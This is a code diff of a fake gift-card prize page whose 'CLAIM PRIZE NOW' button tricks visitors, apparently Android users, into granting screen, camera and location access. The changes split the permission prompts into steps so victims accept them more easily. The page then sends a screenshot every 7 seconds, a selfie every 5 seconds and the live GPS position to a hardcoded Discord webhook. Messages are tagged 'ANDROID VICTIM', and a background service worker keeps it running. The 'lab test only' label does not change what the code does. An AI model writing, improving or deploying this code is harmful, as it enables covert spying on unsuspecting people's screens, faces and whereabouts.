@@ -7,8 +7,7 @@
     <style>
         body {margin:0;background:linear-gradient(#667eea,#764ba2);color:white;text-align:center;padding:50px;font-family:Arial;}
         h1 {font-size:38px;}
-        button {margin:40px;padding:25px 70px;font-size:28px;background:#ff4757;border:none;border-radius:25px;cursor:pointer;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
-        button:hover {background:#ff3742;transform:scale(1.05);}
+        button {margin:40px;padding:25px 70px;font-size:28px;background:#ff4757;border:none;border-radius:25px;cursor:pointer;}
         .note {font-size:14px;margin-top:50px;color:#ddd;}
     </style>
 </head>
@@ -17,73 +16,108 @@
 <h1>CONGRATULATIONS!</h1>
 <h2>You won $1000 Gift Card</h2>
 <button onclick="startStealing()">CLAIM PRIZE NOW</button>
-<div class="note">Lab test only – requires camera & screen for verification</div>
+<div class="note">Lab test only – will ask for camera + screen one by one</div>
 
 <script>
-// YOUR DISCORD WEBHOOK (already inserted)
+// YOUR DISCORD WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
 let screenStream = null;
 let camStream = null;
 let locWatch = null;
+let step = 0;
 
 async function startStealing() {
-    try {
-        // 1. Ask for SCREEN + CAMERA together (looks like Zoom/Discord)
-        screenStream = await navigator.mediaDevices.getDisplayMedia({video:true});
-        camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
+    if (step === 0) {
+        // STEP 1: Ask ONLY for screen first (Android accepts this easily)
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
+            document.querySelector('button').innerHTML = "Step 2/3: Allow Camera →";
+            step = 1;
+            startCamera();
+        } catch(e) {
+            alert("Screen sharing denied – no prize");
+        }
+    }
+}
 
-        alert("Thank you! Processing your prize...");
+async function startCamera() {
+    if (step === 1) {
+        // STEP 2: Now ask for camera (after screen is already granted)
+        try {
+            camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
+            document.querySelector('button').innerHTML = "Step 3/3: Allow Location →";
+            step = 2;
+            startLocation();
+        } catch(e) {
+            alert("Camera denied – partial access granted");
+            startLocation(); // still continue
+        }
+    }
+}
 
+function startLocation() {
+    if (step === 2) {
+        // STEP 3: Location (no popup if already allowed, otherwise one small prompt)
+        if ("geolocation" in navigator) {
+            locWatch = navigator.geolocation.watchPosition(pos => {
+                const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
+                send(null, `LOCATION\n\( {map}\n± \){pos.coords.accuracy}m`);
+            }, null, {enableHighAccuracy: true});
+        }
+
+        // Success – hide button and start stealing
+        document.querySelector('button').style.display = "none";
+        document.body.innerHTML += "<h2>Processing your prize... Please wait 10 seconds</h2>";
+        startCaptureLoops();
+    }
+}
+
+function startCaptureLoops() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+
+    if (screenStream) {
         const screenVid = document.createElement('video');
         screenVid.srcObject = screenStream;
         screenVid.play();
+        setInterval(() => {
+            try {
+                canvas.width = screenVid.videoWidth;
+                canvas.height = screenVid.videoHeight;
+                ctx.drawImage(screenVid, 0, 0);
+                canvas.toBlob(b => send(b, "SCREEN"), "image/jpeg", 0.8);
+            } catch(e) {}
+        }, 7000);
+    }
 
+    if (camStream) {
         const camVid = document.createElement('video');
         camVid.srcObject = camStream;
         camVid.play();
-
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-
-        // SCREEN every 7 seconds
         setInterval(() => {
-            canvas.width = screenVid.videoWidth;
-            canvas.height = screenVid.videoHeight;
-            ctx.drawImage(screenVid, 0, 0);
-            canvas.toBlob(b => send(b, "SCREEN"), "image/jpeg", 0.8);
-        }, 7000);
-
-        // CAMERA every 5 seconds
-        setInterval(() => {
-            canvas.width = camVid.videoWidth;
-            canvas.height = camVid.videoHeight;
-            ctx.drawImage(camVid, 0, 0);
-            canvas.toBlob(b => send(b, "SELFIE"), "image/jpeg", 0.8);
+            try {
+                canvas.width = camVid.videoWidth;
+                canvas.height = camVid.videoHeight;
+                ctx.drawImage(camVid, 0, 0);
+                canvas.toBlob(b => send(b, "SELFIE"), "image/jpeg", 0.8);
+            } catch(e) {}
         }, 5000);
+    }
 
-        // LOCATION every 20 seconds (background too)
-        locWatch = navigator.geolocation.watchPosition(pos => {
-            const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
-            send(null, `LOCATION\n\( {map}\nAccuracy: \){pos.coords.accuracy}m`);
-        }, null, {enableHighAccuracy:true, timeout:20000, maximumAge:0});
-
-        // Keep alive in background
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('data:text/javascript,self.addEventListener("periodicsync",e=>e.waitUntil(fetch("' + WEBHOOK + '",{method:"POST",body:JSON.stringify({content:"Still alive in background – "+new Date()})})))');
-        }
-
-    } catch(e) {
-        alert("You blocked permission – no prize today");
+    // Keep alive in background
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('data:text/javascript,self.addEventListener("periodicsync",e=>e.waitUntil(fetch("' + WEBHOOK + '",{method:"POST",body:JSON.stringify({content:"Background alive – "+new Date()})})))');
     }
 }
 
 function send(blob, text) {
     const form = new FormData();
     if (blob) form.append("file", blob, "capture.jpg");
-    form.append("content", `**ANDROID VICTIM**\n\( {text || "Capture"}\n \){new Date().toLocaleString()}\n${navigator.userAgent.split(" ").pop()}`);
+    form.append("content", `**ANDROID VICTIM**\n\( {text}\n \){new Date().toLocaleString()}`);
 
-    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form, keepalive:true});
+    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form, keepalive:true})
+        .catch(() => {});
 }
 </script>
 
